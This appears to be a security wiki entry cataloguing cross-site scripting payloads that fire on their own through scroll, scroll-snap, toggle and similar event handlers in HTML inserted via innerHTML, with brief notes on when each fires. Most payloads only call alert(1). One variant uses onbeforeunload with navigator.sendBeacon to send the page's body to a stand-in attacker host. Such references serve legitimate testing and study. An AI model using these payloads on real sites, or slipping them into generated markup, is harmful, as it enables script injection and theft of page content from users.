---
title: Scroll / Snap / Misc Auto-Fire Event Handlers
slug: scroll-snap-misc-events
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# Scroll / Snap / Misc Auto-Fire Event Handlers

## Payload

```html
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px"><div style=width:1000px>scroll right</div></xss>
```

## Variants

```html
<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:start></div></address>
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
<geolocation onvalidationstatuschange=alert(1)>
<xss onsecuritypolicyviolation=alert(1)>XSS</xss>
<details ontoggle=alert(1) open>test</details>
<body onbeforeunload=navigator.sendBeacon('//evil.example/',document.body.innerHTML)>
```

## Context

`onscrollend` fires when the browser finishes a scroll (auto-fires when the element's scrollable area is wider than its viewport and the page renders). `onscrollsnapchange` fires on CSS scroll snap. `onvalidationstatuschange` is an experimental event on `<geolocation>` (Chromium-specific). `onsecuritypolicyviolation` fires when a CSP violation occurs — useful when the page itself generates violations. `<details open ontoggle>` fires immediately when the `<details>` element is rendered with the `open` attribute. All require `innerHTML` sink; most fire without user interaction in Chromium browsers.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
